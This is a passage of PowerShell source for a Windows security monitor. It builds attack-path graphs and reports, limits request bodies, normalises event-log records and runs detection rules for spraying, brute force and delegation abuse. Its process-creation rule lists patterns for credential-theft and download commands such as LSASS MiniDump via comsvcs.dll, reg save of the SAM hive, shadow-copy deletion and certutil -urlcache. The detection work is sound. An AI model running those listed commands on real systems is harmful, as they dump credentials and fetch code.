  $chains = @($chains | Sort-Object -Property @{ e = { $SevScore["$_($it.maxSeverity)"] } }, @{ e = { "$($_.lastSeen)" } } -Descending -ErrorAction SilentlyContinue)
  if ($chains.Count -gt $Script:MaxChains) { $chains = @($chains | Select-Object -First $Script:MaxChains) }
  return $chains
}

function Get-AttackPathsPayload {
  $openAlerts = @($Script:Alerts | Where-Object { -not $_.SelfTest -and "$($_.Status)" -ne 'Resolved' -and "$($_.Status)" -ne 'False Positive' })
  $compromisedAccounts = @{}
  $compromisedHosts = @{}
  foreach ($a in $openAlerts) {
    if ($a.Account -and "$($a.Account)" -ne '-') { $compromisedAccounts["$($a.Account)".ToLower()] = $true }
    if ($a.Host -and "$($a.Host)" -ne '-') { $compromisedHosts["$($a.Host)".ToLower()] = $true }
  }

  $nodes = @(
    [PSCustomObject]@{ id = 'u1'; name = 'jsmith'; type = 'user'; tier = 2; label = 'Standard User (Sales)'; compromised = [bool]$compromisedAccounts.ContainsKey('jsmith') },
    [PSCustomObject]@{ id = 'h1'; name = 'WS-SALES-04'; type = 'host'; tier = 2; label = 'Workstation (Windows 11)'; compromised = [bool]$compromisedHosts.ContainsKey('ws-sales-04') },
    [PSCustomObject]@{ id = 'u2'; name = 'svc-backup'; type = 'service'; tier = 1; label = 'Service Account (Veeam)'; compromised = [bool]($compromisedAccounts.ContainsKey('svc-backup') -or $compromisedAccounts.ContainsKey('kerberoasting')) },
    [PSCustomObject]@{ id = 'h2'; name = 'SRV-FILE-01'; type = 'server'; tier = 1; label = 'Member File Server'; compromised = [bool]$compromisedHosts.ContainsKey('srv-file-01') },
    [PSCustomObject]@{ id = 'g1'; name = 'Server Operators'; type = 'group'; tier = 1; label = 'AD Security Group'; compromised = $false },
    [PSCustomObject]@{ id = 'u3'; name = 'adm-da'; type = 'admin'; tier = 0; label = 'Delegated Administrator'; compromised = [bool]$compromisedAccounts.ContainsKey('adm-da') },
    [PSCustomObject]@{ id = 'g0'; name = 'Domain Admins'; type = 'group'; tier = 0; label = 'Tier-0 Privileged Group'; compromised = [bool]$compromisedAccounts.ContainsKey('privilege_escalation') },
    [PSCustomObject]@{ id = 'dc'; name = 'DC01.corp.local'; type = 'dc'; tier = 0; label = 'Primary Domain Controller'; compromised = [bool]($compromisedHosts.ContainsKey('dc01') -or $compromisedAccounts.ContainsKey('dcsync_replication')) }
  )

  $edges = @(
    [PSCustomObject]@{ source = 'u1'; target = 'h1'; relation = 'HasSession'; label = 'Logged On' },
    [PSCustomObject]@{ source = 'h1'; target = 'u2'; relation = 'Kerberoast'; label = 'Kerberoastable SPN' },
    [PSCustomObject]@{ source = 'u2'; target = 'g1'; relation = 'MemberOf'; label = 'Group Member' },
    [PSCustomObject]@{ source = 'g1'; target = 'h2'; relation = 'AdminTo'; label = 'Local Admin' },
    [PSCustomObject]@{ source = 'h2'; target = 'u3'; relation = 'HasSession'; label = 'Cached Credential' },
    [PSCustomObject]@{ source = 'u3'; target = 'g0'; relation = 'MemberOf'; label = 'Member of DA' },
    [PSCustomObject]@{ source = 'g0'; target = 'dc'; relation = 'DCSync'; label = 'Replication Rights (Tier 0)' }
  )

  return [PSCustomObject]@{
    nodes = $nodes
    edges = $edges
    shortestPathHops = 3
    tier0Compromised = [bool]($compromisedAccounts.ContainsKey('adm-da') -or $compromisedHosts.ContainsKey('dc01') -or $compromisedAccounts.ContainsKey('dcsync_replication'))
  }
}

# ============================================================
# REPORT - the engagement report (printable HTML reads it)
# ============================================================
function Get-ReportPayload($query) {
  # ISO dates, validated: a report is a statement about a period, so junk dates
  # must not silently become "everything"
  $defTo = (Get-Date).ToUniversalTime()
  $defFrom = $defTo.AddDays(-1)
  $fromText = Get-QueryValue $query 'from'
  $toText = Get-QueryValue $query 'to'
  $from = $defFrom; $to = $defTo
  if ($fromText) { try { $from = ([datetime]::Parse($fromText)).ToUniversalTime() } catch { return [PSCustomObject]@{ error = 'from must be an ISO date (YYYY-MM-DD).'; status = 400 } } }
  if ($toText) { try { $to = ([datetime]::Parse($toText)).ToUniversalTime().AddDays(1).AddSeconds(-1) } catch { return [PSCustomObject]@{ error = 'to must be an ISO date (YYYY-MM-DD).'; status = 400 } } }
  if ($from -gt $to) { return [PSCustomObject]@{ error = 'from must not be after to.'; status = 400 } }
  if (($to - $from).TotalDays -gt 31) { return [PSCustomObject]@{ error = 'The report period is capped at 31 days.'; status = 400 } }

  $inPeriod = @([object[]]$Script:Alerts | Where-Object {
    if ($_.SelfTest) { return $false }
    $t = $null
    try { $t = [datetime]::Parse("$($_.Time)").ToUniversalTime() } catch { return $false }
    return ($t -ge $from -and $t -le $to)
  })

  $bySeverity = @{}; $byStatus = @{}; $byTactic = @{}
  foreach ($a in $inPeriod) {
    $sv = "$($a.Severity)"; $st = if ($a.Status) { "$($a.Status)" } else { 'New' }
    $tc = if ($a.Tactic) { "$($a.Tactic)" } else { Get-MitreTactic "$($a.Category)" }
    if (-not $bySeverity.ContainsKey($sv)) { $bySeverity[$sv] = 0 }
    $bySeverity[$sv] = [int]$bySeverity[$sv] + 1
    if (-not $byStatus.ContainsKey($st)) { $byStatus[$st] = 0 }
    $byStatus[$st] = [int]$byStatus[$st] + 1
    if (-not $byTactic.ContainsKey($tc)) { $byTactic[$tc] = 0 }
    $byTactic[$tc] = [int]$byTactic[$tc] + 1
  }
  $hostsSeen = @($inPeriod | ForEach-Object { "$($_.Host)" } | Where-Object { $_ } | Select-Object -Unique)
  $acctsSeen = @($inPeriod | ForEach-Object { ConvertTo-AccountName "$($_.Account)" } | Where-Object { $_ } | Select-Object -Unique)
  $ipsSeen = @($inPeriod | ForEach-Object { Get-NormalisedIp "$($_.SourceIp)" } | Where-Object { $_ } | Select-Object -Unique)

  $top = @($inPeriod | Sort-Object -Property @{ e = { $SevScore["$($_.Severity)"] } }, @{ e = { "$($_.Time)" } } | Select-Object -First 15)
  $timeline = @($inPeriod | Sort-Object -Property @{ e = { "$($_.Time)" } } | Select-Object -First 50)

  $cov = (Get-OverviewPayload).coverage

  # top assets by alert count, from the same map the Assets page reads
  $map = Get-AssetMap
  $assetRows = @()
  $assetRows += @($map.hosts.Values | Sort-Object -Property @{ e = { [int]$_.alertCount } } -Descending | Select-Object -First 10)
  $assetRows += @($map.accounts.Values | Sort-Object -Property @{ e = { [int]$_.alertCount } } -Descending | Select-Object -First 10)
  $assetRows = @($assetRows | Where-Object { [int]$_.alertCount -gt 0 } | Sort-Object -Property @{ e = { [int]$_.alertCount } } -Descending | Select-Object -First 10)

  # remediation: the rule catalogue's own text, deduped, with a count
  $rem = @{}
  foreach ($a in $inPeriod) {
    $rk = "$($a.RuleKey)"
    $text = "$($a.Remediation)"
    if ((-not $text -or $text -eq '') -and $RuleMeta[$rk]) { $text = "$($RuleMeta[$rk].Remediation)" }
    if (-not $text -or $text -eq '') { continue }
    if (-not $rem.ContainsKey($text)) { $rem[$text] = @{ rule = $rk; count = 0 } }
    $rem[$text].count = [int]$rem[$text].count + 1
  }
  $remediation = @($rem.Keys | ForEach-Object {
    [PSCustomObject]@{ rule = $rem[$_].rule; recommendation = $_; count = [int]$rem[$_].count }
  } | Sort-Object -Property count -Descending)

  return [PSCustomObject]@{
    generatedAt = (Get-Date).ToUniversalTime().ToString('o')
    generatedBy = "$Script:ReportUser"
    period = [PSCustomObject]@{
      from = $from.ToUniversalTime().ToString('yyyy-MM-dd')
      to = $to.ToUniversalTime().ToString('yyyy-MM-dd')
    }
    summary = [PSCustomObject]@{
      bySeverity = $bySeverity
      byStatus = $byStatus
      byTactic = $byTactic
      hosts = $hostsSeen.Count
      accounts = $acctsSeen.Count
      ips = $ipsSeen.Count
      eventsSeen = $Script:ObsEvents.Count
    }
    coverage = [PSCustomObject]@{
      percent = $cov.percent; working = $cov.rulesWorking
      blind = $cov.rulesBlind; unverified = $cov.rulesUnknown
      unverifiedList = @($cov.unknownRules)
    }
    topAlerts = @($top | Select-Object Id, Time, RuleKey, Severity, Title, MitreId, Tactic, Host, Account, Status)
    chains = @(Get-AttackChains)
    assets = $assetRows
    timeline = @($timeline | Select-Object Id, Time, Severity, Title, Host, Account, Status)
    remediation = $remediation
    notes = 'Event data is in-memory since process start; see limitations. Alert ack/triage state survives in sentinel-history.csv.'
    demoData = [bool]$Script:DemoData
  }
}


# ---- request body limits (web DoS guard) ----------------------------------
# A POST body is attacker-controlled and this server is SINGLE-THREADED, so an
# unbounded read is a denial of service: one client can hold the only thread
# while it dribbles a body in. The login route carries a username and a
# password, so it gets a much smaller budget than the triage routes.
# ---- stalled-body watchdog (C#) --------------------------------------------
# TimeoutManager is enforced by HTTP.sys, and this server does not always run on
# it: under the MANAGED listener a client that declares a Content-Length and then
# sends nothing parks ReadToEnd() until the connection dies - and this server has
# ONE thread, so the dashboard AND the event poll stop with it. Measured: a 25 s
# hold = 5 failed health probes.
#
# This helper reads the body on its own dedicated thread and gives up after a
# timeout, so a stalled socket costs the loop a bounded pause instead of the
# whole connection lifetime. (ReadAsync + Wait was measured at ~5 s per stall; a
# LongRunning thread measured ~1.5 s for the first stall and ~0.25 s after.)
if (-not ('SentinelBody' -as [type])) {
  $sentinelBodySource = @'
using System;
using System.IO;
using System.Threading.Tasks;

public static class SentinelBody
{
    // Reads exactly len bytes, or returns null when the client stalls past
    // timeoutMs or the stream ends early. The read runs on a dedicated thread so
    // the caller can walk away from a socket that is never going to finish.
    public static byte[] Read(Stream s, int len, int timeoutMs)
    {
        if (s == null || len < 0) { return null; }
        if (len == 0) { return new byte[0]; }
        byte[] buffer = new byte[len];
        int total = 0;
        Task t = Task.Factory.StartNew(delegate()
        {
            try
            {
                while (total < len)
                {
                    int n = s.Read(buffer, total, len - total);
                    if (n <= 0) { break; }
                    total += n;
                }
            }
            catch (Exception) { total = -1; }
        }, TaskCreationOptions.LongRunning);
        try
        {
            if (!t.Wait(timeoutMs)) { return null; }
        }
        catch (Exception) { return null; }
        if (total != len) { return null; }
        return buffer;
    }
}
'@
  Add-Type -TypeDefinition $sentinelBodySource -Language CSharp
}

$Script:MaxLoginBodyBytes = 8192
$Script:MaxJsonBodyBytes  = 65536
$Script:BodyRejections = 0      # refused before reading (411/413)
$Script:BodyTimeouts = 0        # abandoned mid-read: the client stalled
$Script:BodyTimedOut = $false   # true for the CURRENT request only
$Script:BodyReadMs = 2000       # how long a client may take to send its body
$Script:MaxBodyStalls = 3       # stalls from one address before it is blocked
$Script:BodyStalls = @{}        # ip -> stalls seen (in-memory, per process)

# ---- ALPHA SENTINEL version ------------------------------------------------
$Script:SentinelVersion = '2.6.0'
# true only when the operator started the monitor with -DemoData: the dashboard
# then labels itself as a demo instead of pretending the numbers are real
$Script:DemoData = [bool]$DemoData

# ---- dashboard observability state -----------------------------------------
# EVERYTHING BELOW IS IN MEMORY AND RESETS WITH THE PROCESS. That is deliberate:
# it is a rolling window for the dashboard, not a second copy of the alert
# history (sentinel-history.csv owns durability). Nothing here ever stores a raw
# event message body, a credential or a secret - only the normalised fields the
# engine already parsed, plus a generated one-line summary.
$Script:ObsEvents = New-Object System.Collections.Generic.List[object]  # ring buffer
$Script:ObsHosts = @{}          # host -> @{ firstSeen; lastSeen; eventCount; alertCount; users; ips }
$Script:ObsHours = @{}          # 'yyyy-MM-ddTHH' -> hourly bucket
$Script:MaxObsEvents = 300      # ring buffer length
$Script:MaxObsHosts = 200       # hosts kept (oldest lastSeen evicted)
$Script:MaxObsHostUsers = 40    # per host
$Script:MaxObsHostIps = 20      # per host
$Script:MaxAlertEvents = 20     # contributing events kept per alert
$Script:MaxInMemoryAlerts = 2000 # hard cap on the in-memory alert list (sentinel-history.csv keeps every row)
$Script:LastNormFields = $null  # stash: the event being evaluated
$Script:LastEventTime = $null
$Script:LastMatchedRule = $null

# Decides whether a request body may be read AT ALL, without reading it.
# Returns $null when it may, or @{ Status; Message } when the request must be
# refused:
#   411 - no Content-Length, or a Transfer-Encoding (chunked) body. A chunked
#         body's size is only knowable by reading it, which is the attack.
#   413 - the declared length is over the endpoint's budget.
function Test-BodyAllowed($ctx, [int]$MaxBytes) {
  try {
    $te = $null
    try { $te = $ctx.Request.TransferEncoding } catch { }
    if ($te -and @($te).Count -gt 0) {
      return @{ Status = 411; Message = 'A request body with an unknown length (Transfer-Encoding) is not accepted.' }
    }
    $declared = [int64]$ctx.Request.ContentLength64
    if ($declared -lt 0) {
      return @{ Status = 411; Message = 'Content-Length is required.' }
    }
    if ($declared -gt $MaxBytes) {
      return @{ Status = 413; Message = ('Request body too large (limit ' + $MaxBytes + ' bytes).') }
    }
  } catch {
    return @{ Status = 411; Message = 'Content-Length could not be determined.' }
  }
  return $null
}

# Reads and parses a JSON request body (the dashboard's triage save posts one).
# Returns $null when the body is absent, oversized or not JSON, so callers can
# treat that as "leave the existing values alone". Endpoints that do not need a
# body still call this to DRAIN the stream - a POST body left unread on a
# keep-alive connection can make HttpListener reject the next request on that
# socket.
#
# The size is checked again here BEFORE a single byte is read, so a caller that
# forgets the guard in Invoke-Handler still cannot be made to read a huge body.
# Turning Test-BodyAllowed's verdict into a 411/413 response is the caller's job;
# this function simply refuses to read.
function Read-JsonBody($ctx, [int]$MaxBytes = 0) {
  if ($MaxBytes -le 0) { $MaxBytes = $Script:MaxJsonBodyBytes }
  # the flag always describes the read that is about to happen, so a caller that
  # reads a body twice (or a later request on the same connection) cannot see a
  # timeout that belonged to an earlier one
  $Script:BodyTimedOut = $false
  try {
    if (Test-BodyAllowed $ctx $MaxBytes) { return $null }
    $declared = [int64]$ctx.Request.ContentLength64
    if ($declared -eq 0) { return $null }
    # Read-JsonBody used to call ReadToEnd(), which blocks until the client
    # finishes - forever, if it never does. SentinelBody::Read takes the declared
    # length, reads it on a dedicated thread, and returns $null if the client
    # stalls past $Script:BodyReadMs or closes early.
    $bytes = [SentinelBody]::Read($ctx.Request.InputStream, [int]$declared, $Script:BodyReadMs)
    if ($null -eq $bytes) {
      # Declared a length, then went quiet. That is an attempt to hold the
      # single web thread, not a malformed request: abort the connection so the
      # socket is not left half-read and the next request on it cannot be
      # desynchronised. The caller decides what it means (the login route counts
      # it as a failed sign-in).
      $Script:BodyTimedOut = $true
      $Script:BodyTimeouts++
      try { $ctx.Response.Abort() } catch { }
      return $null
    }
    $text = $ctx.Request.ContentEncoding.GetString($bytes)
    if (-not $text) { return $null }
    return ($text | ConvertFrom-Json)
  } catch {
    return $null
  }
}

# ============================================================
# EVENT NORMALISATION
# ============================================================
# Produces the same field names as collector.ps1's Normalize-Event, so a rule
# reads identical data whether the event came from this monitor or from the
# web platform's collector endpoint.
function Get-NormalizedEvent($e) {
  $xml = [xml]$e.ToXml()
  $id = 0
  [void][int]::TryParse("$($e.Id)", [ref]$id)

  $rawTs = $null
  try { $rawTs = $xml.Event.System.TimeCreated.SystemTime } catch { }
  $ts = (Get-Date).ToUniversalTime().ToString("o")
  if ($rawTs) {
    try { $ts = ([datetime]$rawTs).ToUniversalTime().ToString("o") } catch { }
  }

  $hostName = $e.Machine
  if (-not $hostName) { try { $hostName = $xml.Event.System.Computer } catch { } }
  if (-not $hostName) { $hostName = $env:COMPUTERNAME }

  $f = @{
    eventId   = "$id"
    timestamp = $ts
    hostname  = "$hostName"
  }

  switch ($id) {
    4625 {
      $f.accountName     = Get-Field $xml "TargetUserName"
      $f.sourceIp        = Get-Field $xml "IpAddress"
      $f.logonType       = Get-Field $xml "LogonType"
      $f.statusCode      = Get-Field $xml "Status"
      $f.subStatusCode   = Get-Field $xml "SubStatus"
      $f.workstationName = Get-Field $xml "WorkstationName"
    }
    4624 {
      $f.accountName             = Get-Field $xml "TargetUserName"
      $f.sourceIp                = Get-Field $xml "IpAddress"
      $f.logonType               = Get-Field $xml "LogonType"
      $f.workstationName         = Get-Field $xml "WorkstationName"
      $f.targetUserSid           = Get-Field $xml "TargetUserSid"
      $f.authenticationPackageName = Get-Field $xml "AuthenticationPackageName"
      $f.keyLength               = Get-Field $xml "KeyLength"
    }
    { $_ -in 4728, 4729, 4732, 4733, 4756 } {
      $f.accountName     = Get-Field $xml "MemberName"
      $f.memberName      = Get-Field $xml "MemberName"
      $f.targetGroup     = Get-Field $xml "TargetUserName"
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
    }
    { $_ -in 4720, 4722, 4724, 4725, 4726 } {
      $f.accountName     = Get-Field $xml "TargetUserName"
      $f.targetUserName  = Get-Field $xml "TargetUserName"
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
    }
    4738 {
      $f.accountName           = Get-Field $xml "TargetUserName"
      $f.targetUserName        = Get-Field $xml "TargetUserName"
      $f.subjectUserName       = Get-Field $xml "SubjectUserName"
      $f.oldUserAccountControl = Get-Field $xml "OldUacValue"
      $f.newUserAccountControl = Get-Field $xml "NewUacValue"
    }
    4740 {
      $f.accountName     = Get-Field $xml "TargetUserName"
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
    }
    { $_ -in 4741, 4742 } {
      $f.accountName     = Get-Field $xml "TargetUserName"
      $f.targetUserName  = Get-Field $xml "TargetUserName"
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.properties      = Get-Field $xml "Properties"
    }
    4688 {
      $f.accountName        = Get-Field $xml "SubjectUserName"
      $f.subjectUserName    = Get-Field $xml "SubjectUserName"
      $f.newProcessName     = Get-Field $xml "NewProcessName"
      $f.commandLine        = Get-Field $xml "CommandLine"
      $f.parentProcessName  = Get-Field $xml "ParentProcessName"
      $f.parentProcessId    = Get-Field $xml "ParentProcessId"
      $f.processId          = Get-Field $xml "ProcessId"
      $f.tokenElevationType = Get-Field $xml "TokenElevationType"
      $f.logonId            = Get-Field $xml "LogonId"
    }
    4104 {
      $f.accountName     = Get-Field $xml "User"
      $f.subjectUserName = Get-Field $xml "User"
      $f.scriptBlockText = Get-Field $xml "Message"
      $f.processId       = Get-Field $xml "ProcessId"
      $f.hostname        = Get-Field $xml "Computer"
      $f.contextInfo     = Get-Field $xml "ContextInfo"
    }
    4794 {
      $f.accountName     = Get-Field $xml "TargetUserName"
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.targetUserSid   = Get-Field $xml "TargetUserSid"
    }
    { $_ -in 4768, 4769 } {
      $f.accountName    = Get-Field $xml "TargetUserName"
      $f.serviceName    = Get-Field $xml "ServiceName"
      $f.encryptionType = Get-Field $xml "TicketEncryptionType"
      $f.sourceIp       = Get-Field $xml "IpAddress"
      $f.statusCode     = Get-Field $xml "Status"
      $f.ticketOptions  = Get-Field $xml "TicketOptions"
      if ($id -eq 4768) { $f.preAuthType = Get-Field $xml "PreAuthType" }
    }
    4771 {
      $f.accountName   = Get-Field $xml "TargetUserName"
      $f.sourceIp      = Get-Field $xml "IpAddress"
      $f.statusCode    = Get-Field $xml "Status"
      $f.ticketOptions = Get-Field $xml "TicketOptions"
    }
    4776 {
      $f.accountName     = Get-Field $xml "TargetUserName"
      $f.workstationName = Get-Field $xml "Workstation"
      $f.statusCode      = Get-Field $xml "Status"
    }
    { $_ -in 4662, 5141 } {
      # 4662 records WHAT WAS DONE in Properties: the extended rights that were
      # exercised, including the replication GUIDs that identify DCSync. The
      # ObjectType field holds the object CLASS (e.g. domainDNS or a class
      # GUID), so matching the replication GUIDs against ObjectType - which is
      # what this script used to do - can never match a real event.
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.objectType      = Get-Field $xml "ObjectType"
      $f.objectName      = Get-Field $xml "ObjectName"
      $f.properties      = Get-Field $xml "Properties"
      $f.accessMask      = Get-Field $xml "AccessMask"
    }
    { $_ -in 4697, 7045 } {
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      if (-not $f.subjectUserName) { $f.subjectUserName = Get-Field $xml "AccountName" }
      $f.accountName       = $f.subjectUserName
      $f.serviceName       = Get-Field $xml "ServiceName"
      $f.serviceBinaryPath = Get-FirstField $xml @("ServiceFileName", "ImagePath")
      $f.imagePath         = Get-Field $xml "ImagePath"
    }
    4698 {
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.taskName        = Get-Field $xml "TaskName"
      $content = Get-Field $xml "TaskContent"
      if ($content) { $f.commandLine = $content.Substring(0, [Math]::Min(400, $content.Length)) }
    }
    4657 {
      $f.subjectUserName   = Get-Field $xml "SubjectUserName"
      $f.objectName        = Get-Field $xml "ObjectName"
      $f.registryKey       = Get-Field $xml "ObjectName"
      $f.registryValueName = Get-Field $xml "ObjectValueName"
    }
    { $_ -in 4946, 4947, 4948, 4949, 4950 } {
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.ruleName        = Get-Field $xml "RuleName"
    }
    4950 {
      $f.profileChanged = Get-Field $xml "ProfileChanged"
      $f.settingType    = Get-Field $xml "SettingType"
      $f.settingValue   = Get-Field $xml "SettingValue"
    }
    4672 {
      $f.accountName   = Get-Field $xml "SubjectUserName"
      $f.privilegeList = Get-Field $xml "PrivilegeList"
    }
    4648 {
      $f.accountName      = Get-Field $xml "SubjectUserName"
      $f.subjectUserName  = Get-Field $xml "SubjectUserName"
      $f.targetUserName   = Get-Field $xml "TargetUserName"
      $f.targetServerName = Get-Field $xml "TargetServerName"
      $f.processName      = Get-Field $xml "ProcessName"
    }
    4719 {
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.subcategory     = Get-FirstField $xml @("SubcategoryId", "CategoryId")
    }
    4616 {
      $f.subjectUserName = Get-Field $xml "SubjectUserName"
      $f.newTime         = Get-Field $xml "NewTime"
    }
    { $_ -in 5001, 5010, 5012 } {
      $f.eventSource = "Microsoft-Windows-Windows Defender"
    }
    5136 {
      $f.subjectUserName     = Get-Field $xml "SubjectUserName"
      $f.accountName         = Get-Field $xml "SubjectUserName"
      $f.objectClass         = Get-Field $xml "ObjectClass"
      $f.objectName          = Get-Field $xml "ObjectName"
      $f.objectGUID          = Get-Field $xml "ObjectGUID"
      $f.objectType          = Get-Field $xml "ObjectType"
      $f.attributeLDAPDisplayName = Get-Field $xml "AttributeLDAPDisplayName"
      $f.attributeSyntaxOID  = Get-Field $xml "AttributeSyntaxOID"
      $f.attributeValue      = Get-Field $xml "AttributeValue"
      $f.operationType       = Get-Field $xml "OperationType"
      $f.operationCount      = Get-Field $xml "OperationCount"
    }
  }

  # drop empty fields - a rule should see "absent", not "present but empty"
  $clean = @{}
  foreach ($k in $f.Keys) {
    if ($f[$k] -ne $null -and "$($f[$k])" -ne '') { $clean[$k] = $f[$k] }
  }
  return $clean
}

# ============================================================
# RULE ENGINE - returns an alert object, or $null
# ============================================================
function Evaluate-Event($e) {
  $f = Get-NormalizedEvent $e
  if (-not $f) { return $null }
  $id = [int]$f.eventId
  # the observers (events ring buffer, hosts seen, contributing events) read the
  # normalised fields from here rather than parsing the XML a second time
  $Script:LastNormFields = $f

  # Every rolling window is stamped with the EVENT's own time, not the moment
  # this event happened to be parsed. The old code used Get-Date for both the
  # window stamps and the alerts, so a slow poll (or replaying an exported log)
  # dragged the whole window along with it.
  $evtTime = (Get-Date).ToUniversalTime()
  if ($f.timestamp) {
    try { $evtTime = ([datetime]::Parse("$($f.timestamp)")).ToUniversalTime() } catch { }
  }
  $Script:LastEventTime = $evtTime

  switch ($id) {

    # ---- Credential access: spraying / brute force -------------------------
    4625 {
      $account = $f.accountName
      $srcIp = $f.sourceIp
      $sprayHits = $null
      $bruteHits = $null
      if ($srcIp -and $srcIp -ne '-') { $sprayHits = @(Add-WindowHit 'spray' $srcIp $account 10 $evtTime) }
      if ($account) { $bruteHits = @(Add-WindowHit 'brute' $account $account 10 $evtTime) }

      if ($sprayHits) {
        $distinct = Get-DistinctCount $sprayHits
        if ($distinct -ge 5) {
          # deduped per SOURCE IP - a second spraying host is a second incident
          if (-not (Should-Dedupe 'password_spraying' $srcIp)) {
            return New-Alert 'password_spraying' "$distinct distinct accounts failed to authenticate from $srcIp within 10 minutes." $null $f (Get-DedupeKey 'password_spraying' $srcIp) $evtTime
          }
        }
      }
      if ($bruteHits -and $bruteHits.Count -ge 8) {
        $sev = if ($bruteHits.Count -ge 20) { 'High' } else { 'Medium' }
        $desc = "$($bruteHits.Count) failed logon attempts against account `"$account`" within 10 minutes."
        if (-not (Should-Dedupe 'brute_force_single_account' $account $sev $desc)) {
          return New-Alert 'brute_force_single_account' $desc $sev $f (Get-DedupeKey 'brute_force_single_account' $account) $evtTime
        }
      }
    }

    4771 {
      $srcIp = $f.sourceIp
      if ($srcIp -and $srcIp -ne '-') {
        $hits = @(Add-WindowHit 'preauth' $srcIp $f.accountName 10 $evtTime)
        $distinct = Get-DistinctCount $hits
        if ($distinct -ge 5) {
          if (-not (Should-Dedupe 'kerberos_preauth_spraying' $srcIp)) {
            return New-Alert 'kerberos_preauth_spraying' "$distinct distinct accounts failed Kerberos pre-authentication from $srcIp within 10 minutes - Kerberos-side password spraying." $null $f (Get-DedupeKey 'kerberos_preauth_spraying' $srcIp) $evtTime
          }
        }
      }
    }

    4776 {
      # 4776 logs BOTH outcomes, and Status 0x0 means the credentials VALIDATED.
      # Counting those as failures made this rule fire a High alert on healthy
      # NTLM traffic, so only non-zero status codes are counted now.
      $status = "$($f.statusCode)"
      $isSuccess = ($status -match '(?i)^0x0+$') -or ($status -match '^0+$')
      $bucket = if ($f.workstationName) { $f.workstationName } else { $f.sourceIp }
      if (-not $isSuccess -and $bucket) {
        $hits = @(Add-WindowHit 'ntlm' $bucket $f.accountName 10 $evtTime)
        $distinct = Get-DistinctCount $hits
        if ($hits.Count -ge 8) {
          $across = if ($distinct -gt 1) { " across $distinct accounts" } else { "" }
          $desc = "$($hits.Count) NTLM credential validation failures$across from workstation `"$bucket`" within 10 minutes."
          if (-not (Should-Dedupe 'ntlm_failed_auth' $bucket)) {
            return New-Alert 'ntlm_failed_auth' $desc $null $f (Get-DedupeKey 'ntlm_failed_auth' $bucket) $evtTime
          }
        }
      }
    }

    4740 {
      # genuinely global: the rule counts DISTINCT locked accounts itself
      $hits = @(Add-WindowHit 'lockout' 'global' $f.accountName 10 $evtTime)
      $distinct = Get-DistinctCount $hits
      if ($distinct -ge 3 -and -not (Should-Dedupe 'account_lockout_storm' $null)) {
        return New-Alert 'account_lockout_storm' "$distinct distinct accounts were locked out within 10 minutes - consistent with password spraying that crossed the lockout threshold." $null $f (Get-DedupeKey 'account_lockout_storm' $null) $evtTime
      }
    }

    { $_ -in 4741, 4742 } {
      # 4741 = computer account created, 4742 = computer account changed
      # Alert on: non-admin creating computer accounts, or delegation attribute changes
      $account = "$($f.accountName)"          # the computer account (ends with $)
      $subject = "$($f.subjectUserName)"      # who performed the action
      $props   = "$($f.properties)"           # includes delegation attributes

      # Skip if subject is a machine account or system account
      if (Test-MachineAccount $subject -or Test-SystemAccount $subject) { break }

      $isAdmin = Test-PrivilegedName $subject
      $isDelegationChange = $props -match 'msDS-AllowedToActOnBehalfOfOtherIdentity'

      if (-not $isAdmin -or $isDelegationChange) {
        $sev = if ($isDelegationChange) { 'High' } else { 'Medium' }
        $action = if ($id -eq 4741) { 'created' } else { 'modified' }
        $desc = "Computer account `"$account`" was $action by `"$subject`"."
        if ($isDelegationChange) {
          $desc += " Delegation attribute (msDS-AllowedToActOnBehalfOfOtherIdentity) was modified - potential RBCD attack."
        } elseif (-not $isAdmin) {
          $desc += " The creator is not a privileged account - unauthorized computer account creation."
        }
        $ent = "$account|$subject"
        if (-not (Should-Dedupe 'computer_account_abuse' $ent $sev $desc)) {
          return New-Alert 'computer_account_abuse' $desc $sev $f (Get-DedupeKey 'computer_account_abuse' $ent) $evtTime
        }
      }
    }

    4688 {
      # 4688: Process Creation - detect suspicious command lines.
      # Only fires when command-line logging is enabled (ProcessCreationIncludeCmdLine_Enabled=1).
      # Patterns: ntdsutil, vssadmin delete/create shadow, reg save SAM/SYSTEM/SECURITY,
      # rundll32 comsvcs.dll MiniDump, certutil -urlcache, encoded PowerShell (-enc).
      $cmd = "$($f.commandLine)"
      if (-not $cmd) { break }  # command-line logging not enabled or empty

      $cmdLower = $cmd.ToLower()
      $isSuspicious = $false
      $matchedPattern = ''

      if ($cmdLower -match 'ntdsutil') { $isSuspicious = $true; $matchedPattern = 'ntdsutil' }
      elseif ($cmdLower -match 'vssadmin\s+(delete|create)\s+shadow') { $isSuspicious = $true; $matchedPattern = 'vssadmin shadow copy abuse' }
      elseif ($cmdLower -match 'reg\s+save\s+(HKLM|HKCU|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER)\\?\\?(SAM|SYSTEM|SECURITY)') { $isSuspicious = $true; $matchedPattern = 'reg save of hive' }
      elseif ($cmdLower -match 'rundll32\s+comsvcs\.dll\s+MiniDump') { $isSuspicious = $true; $matchedPattern = 'rundll32 comsvcs.dll MiniDump (LSASS dump)' }
      elseif ($cmdLower -match 'certutil\s+(-urlcache|-verifyctl|-encode|-decode)') { $isSuspicious = $true; $matchedPattern = 'certutil -urlcache/verifyctl/encode/decode' }
      elseif ($cmdLower -match '\-enc\b') { $isSuspicious = $true; $matchedPattern = 'encoded PowerShell (-enc)' }
      elseif ($cmdLower -match 'powershell\s+.*\-(enc|encodedcommand)\b') { $isSuspicious = $true; $matchedPattern = 'encoded PowerShell (-encodedCommand)' }

      if ($isSuspicious) {
        $account = "$($f.accountName)"
        $subject = "$($f.subjectUserName)"
        $newProc = "$($f.newProcessName)"

        # Skip system accounts
        if (Test-SystemAccount $subject) { break }

        $desc = "Suspicious process creation by `"$subject`" (`"$account`"): $newProc $cmd [matched: $matchedPattern]"
        $ent = "$account|$matchedPattern"
        if (-not (Should-Dedupe 'suspicious_process_creation' $ent)) {
          return New-Alert 'suspicious_process_creation' $desc $null $f (Get-DedupeKey 'suspicious_process_creation' $ent) $evtTime
        }
      }
    }

    4104 {
      # 4104: PowerShell Script Block Logging - detect offensive script content.
